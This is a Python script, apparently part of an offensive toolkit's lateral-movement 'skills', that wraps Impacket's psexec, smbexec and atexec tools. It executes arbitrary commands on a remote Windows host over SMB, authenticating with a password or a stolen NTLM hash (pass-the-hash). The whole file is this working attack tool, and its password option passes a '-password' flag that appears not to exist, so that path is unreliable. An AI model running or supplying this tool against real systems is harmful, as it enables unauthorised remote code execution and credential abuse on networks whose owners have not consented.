#!/usr/bin/env python3
"""Execute commands over SMB with psexec/smbexec/atexec wrappers.

Usage:
  python skills/movement/scripts/smb_exec.py -d corp.local -u alice -H <NTLM> --target 10.0.0.50 --exec-method smbexec --command whoami
"""

from __future__ import annotations

import argparse
import json
import shutil
import subprocess
import sys


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="SMB exec wrapper around Impacket tools."
    )
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("-u", "--user", required=True)
    auth = parser.add_mutually_exclusive_group(required=True)
    auth.add_argument("-p", "--password")
    auth.add_argument("-H", "--hash", dest="nt_hash")
    parser.add_argument("--target", required=True)
    parser.add_argument(
        "--exec-method", choices=["psexec", "smbexec", "atexec"], required=True
    )
    parser.add_argument("--command", required=True)
    return parser.parse_args()


def resolve_tool(method: str) -> str | None:
    mapping = {
        "psexec": ["impacket-psexec", "psexec.py"],
        "smbexec": ["impacket-smbexec", "smbexec.py"],
        "atexec": ["impacket-atexec", "atexec.py"],
    }
    for candidate in mapping[method]:
        found = shutil.which(candidate)
        if found:
            return found
    return None


def main() -> int:
    args = parse_args()
    tool = resolve_tool(args.exec_method)
    target = f"{args.domain}/{args.user}@{args.target}"
    command = [tool or f"impacket-{args.exec_method}", target]
    if args.password:
        command.extend(["-password", args.password])
    else:
        command.extend(["-hashes", args.nt_hash])
    command.append(args.command)

    payload: dict[str, object] = {
        "exec_method": args.exec_method,
        "tool": tool or f"impacket-{args.exec_method}",
        "tool_found": bool(tool),
        "command": command,
    }

    if not tool:
        print(
            "[!] Selected Impacket exec tool not found. Printing command only.",
            file=sys.stderr,
        )
        print(" ".join(command))
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        return 0

    result = subprocess.run(command, capture_output=True, text=True, check=False)
    payload["return_code"] = result.returncode
    payload["stdout"] = result.stdout.strip()
    payload["stderr"] = result.stderr.strip()
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0 if result.returncode == 0 else result.returncode


if __name__ == "__main__":
    raise SystemExit(main())
